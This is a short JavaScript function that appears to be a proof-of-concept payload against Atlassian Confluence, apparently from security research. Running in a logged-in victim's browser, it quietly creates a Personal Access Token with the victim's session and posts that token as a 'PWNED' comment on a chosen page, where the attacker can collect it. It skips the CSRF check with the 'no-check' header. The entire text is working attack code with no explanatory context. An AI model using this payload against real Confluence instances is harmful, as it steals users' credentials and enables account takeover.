async function createAndPostToken(pageId) {
    try {
        // Create a new Personal Access Token
        const createTokenResponse = await fetch('/rest/pat/latest/tokens', {
            method: 'POST',
            credentials: 'include',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({name: 'cyllective_was_here', expirationDuration: 1})
        });
        const tokenData = await createTokenResponse.text();
        const { personalAccessToken } = JSON.parse(tokenData);

        if (!personalAccessToken) {
            console.error('No personal access token found');
            return;
        }

        // Post a comment onto a page (pageId) containing the token
        await fetch(`/rest/tinymce/1/content/${pageId}/comment?actions=true`, {
            method: 'POST',
            credentials: 'include',
            headers: {'X-Atlassian-Token': 'no-check'},
            body: `html=%3Cp%3EPWNED:%20${personalAccessToken}%3C%2Fp%3E&watch=false`
        });

    } catch (error) {
        console.error(error);
    }
}